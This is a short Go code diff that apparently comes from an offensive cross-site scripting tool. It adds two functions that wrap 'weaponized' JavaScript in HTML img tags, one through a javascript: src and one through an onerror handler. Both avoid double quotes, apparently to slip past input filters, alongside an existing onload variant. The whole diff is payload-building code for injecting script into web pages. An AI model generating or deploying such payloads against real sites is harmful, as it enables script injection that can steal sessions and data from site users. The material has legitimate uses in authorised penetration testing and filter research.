@@ -36,3 +36,18 @@ func ImagizeScript(js string) (string, error) {
 	weaponized, err := WeaponizeScript(js)
 	return `<img src="` + TinyImage + `" onload="javascript:` + weaponized + `">`, err
 }
+
+// EmptyImageizeScript encodes javascript into an html image without the
+// use of double quotes
+func EmptyImagizeScript(js string) (string, error) {
+	weaponized, err := WeaponizeScript(js)
+	return `<img src=javascript:` + weaponized + `>`, err
+}
+
+// ErrorImagizeScript encodes javascript into an html image without the
+// use of double quotes through the onerror= tag when the image cannot
+// load the src a.
+func ErrorImagizeScript(js string) (string, error) {
+	weaponized, err := WeaponizeScript(js)
+	return `<img src=a onerror=javascript:` + weaponized + `>`, err
+}
